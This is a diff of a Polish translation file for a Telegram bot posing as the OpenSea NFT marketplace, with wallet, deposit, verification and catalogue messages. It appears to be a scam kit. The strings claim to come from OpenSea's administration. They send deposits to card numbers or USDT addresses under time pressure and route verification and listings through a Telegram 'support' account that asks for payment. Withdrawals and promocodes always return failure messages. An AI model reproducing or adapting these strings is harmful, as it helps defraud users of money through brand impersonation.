@@ -2,24 +2,75 @@
     "welcome": "👋Witamy, {first_name}, wybierz usługę poniżej:",
     "blocked": "Jesteś zablokowany!",
     "select_language": "Wybierz język:",
-    "profile": "\uD83D\uDCBC Panel Osobisty\n\n 📌ID: {user_id}\n \uD83D\uDD2EStatus: {status}🎉 \n\n💰 Saldo: {balance} UAH\n📑 Weryfikacja: {verification}\n\uD83D\uDEB8 {ref}",
+    "profile": "📌 ID: {user_id}\n🔮 Status: {status} 🎉 \n\n💰 Saldo: {balance} {currency}\n📑 Weryfikacja: {verification}\n🛡️ {ref}",
     "statuses": {
-            "new": "Nowy"
-        },
+        "stat_blocked": "Zablokowany",
+        "stat_unblocked": "Aktywny"
+    },
+    "verifications": {
+        "verify_yes": "Zweryfikowany",
+        "verify_no": "Niezweryfikowany"
+    },
     "buttons": {
-            "profile_kb": {
-                "wallet": "💰Portfel",
-                "verification": "📑 Weryfikacja",
-                "favorites": "❤️ Ulubione",
-                "statistics": "📈 Statystyka",
-                "settings": "⚙️ Ustawienia",
-                "my_nft": "🎆 Moje NFT",
-                "agreement": "Umowa",
-                "how_to_create_nft": "Jak stworzyć NFT?"
-            },
-            "other": {
-                "example1": "Przykład 1",
-                "example2": "Przykład 2"
-            }
+        "main_kb": {
+            "profile_main": "💼 Profil",
+            "information_main": "ℹ️ Informacje",
+            "support_main": "🛠️ Wsparcie"
+        },
+        "profile_kb": {
+            "wallet": "💰 Portfel",
+            "verification": "📑 Weryfikacja",
+            "favorites": "❤️ Ulubione",
+            "statistics": "📈 Statystyki",
+            "settings": "⚙️ Ustawienia",
+            "my_nft": "🎆 Moje NFT",
+            "agreement": "Umowa",
+            "how_to_create_nft": "Jak stworzyć NFT?"
+        },
+        "wallet_kb": {
+            "top_up": "💸 Doładuj",
+            "withdraw": "💵 Wypłać",
+            "promocode": "📝 Kod promocyjny"
+        },
+        "verification_kb": {
+            "verify": "📑 Zweryfikuj"
+        },
+        "settings_kb": {
+            "language": "🌍 Zmień język",
+            "currency": "💵 Zmień walutę"
+        },
+        "deposit_kb": {
+            "card": "💳 Karta",
+            "crypto": "💰 Kryptowaluta"
+        },
+        "deposit_top_up_kb": {
+            "check": "✅ Sprawdź płatność",
+            "support": "🛠️ Wsparcie"
+        },
+        "catalog_kb": {
+            "buy": "Kup"
         }
+    },
+    "wallet_message": "💰 Twój portfel:\n🔢 Twój identyfikator użytkownika: {user_id}\n🏦 Saldo: {balance} {currency}",
+    "verification_message": "🔹 Twoje konto nie jest zweryfikowane.\n\nAby uzyskać status „Zweryfikowany”, wyślij frazę „Weryfikacja” na ogólny czat wsparcia.\n\nAby przejść do ogólnego czatu wsparcia, przejdź do sekcji „Wsparcie” lub skorzystaj z przycisku poniżej.",
+    "favourites_message": "💠 Masz 0 tokenów w ulubionych.",
+    "statistics_message": "Transakcje w ostatnich 24 godzinach: {no_orders}\nOnline: {no_online}\nOglądających NFT: {no_views}\nNajwiększa transakcja w 24 godziny: ${big_deal}",
+    "settings_message": "⚙️ Ustawienia",
+    "my_nft_message": "Nie masz tokenów",
+    "how_to_create_nft_message": "Aby wystawić swoją własną grafikę NFT 🎆:\n- Musisz skontaktować się z wsparciem (https://t.me/Supp_OpenSea) i wpłacić depozyt.\n- Wsparcie (https://t.me/Supp_OpenSea) ma prawo odrzucić twoje zgłoszenie na pokaz grafiki według własnego uznania.\n- Twoja grafika nie powinna obrażać czyichś interesów. W takim przypadku wsparcie ma prawo odrzucić twoje zgłoszenie, a w przypadku powtarzających się przypadków ma prawo zamrozić twoje konto na określony czas lub nałożyć karę.\n\n Z poważaniem, administracja OpenSea!",
+    "deposit_message": "ℹ️ Wybierz metodę płatności:",
+    "withdraw_message": "💵 Wprowadź kwotę do wypłaty:",
+    "card_message": "💵 Wprowadź kwotę doładowania:",
+    "invalid_amount_message": "Wprowadź prawidłową kwotę",
+    "card_deposit_message": "👨‍💼 Aby doładować saldo\n\n💳 Dane: {card_number}\n💬 Komentarz: {comment}\n\n⚠️ Dane są ważne przez 20 minut od momentu zamówienia. Jeśli nie zapłacisz w tym czasie, zrób kolejne zamówienie danych.⚠️\n\n⚠️ Kliknij na dane lub komentarz, aby skopiować!\n\n⚠️ Jeśli nie możesz podać komentarza, po dokonaniu płatności wyślij paragon/zrzut ekranu do wsparcia.\n\n⚠️ 🛠️ Wsparcie - @Supp_OpenSea\n\nZ poważaniem, OpenSea",
+    "crypto_message": "💠 Wybierz kryptowalutę do płatności:",
+    "crypto_deposit_message": "📍 Dla twojej wygody udostępniamy możliwość doładowania salda przez USDT. Prosimy o przesłanie dowolnej kwoty od 20 USDT na unikalny adres:\n\n{crypto_address}\n\nNasz bot automatycznie przeliczy aktualny kurs USDT i zaksięguje środki na twoim saldzie po pierwszym potwierdzeniu w sieci. Po doładowaniu otrzymasz powiadomienie o zaksięgowaniu środków 🚀\n\nDziękujemy za wybór naszych usług! W razie pytań skontaktuj się z naszym wsparciem. 🌐",
+    "withdraw_success_message": "❌ Błąd",
+    "promocode_message": "✍️ Wprowadź kod promocyjny",
+    "promocode_success_message": "❌ Ten kod promocyjny nie istnieje",
+    "catalog_message": "💠 Łącznie kolekcji na rynku: {collections_number}",
+    "collection_message": "💠 Kolekcja {collection_name}\n\nTokenów w kolekcji: {number_of_tokens}",
+    "token_message": "💠 Token {token_name}\n\n<i>{item_description}</i>\n\n📂 Kolekcja: {category_name}\n👩‍💼 Autor: {item_author}\n🔹 Blockchain: ETH\n\n💵 Cena: {item_price} USD (~ {item_currency_price} {user_currency})",
+    "buy_no_balance": "💲 Niewystarczające środki na twoim saldzie",
+    "buy_success": "💲 Dziękujemy za zakup!"
 }
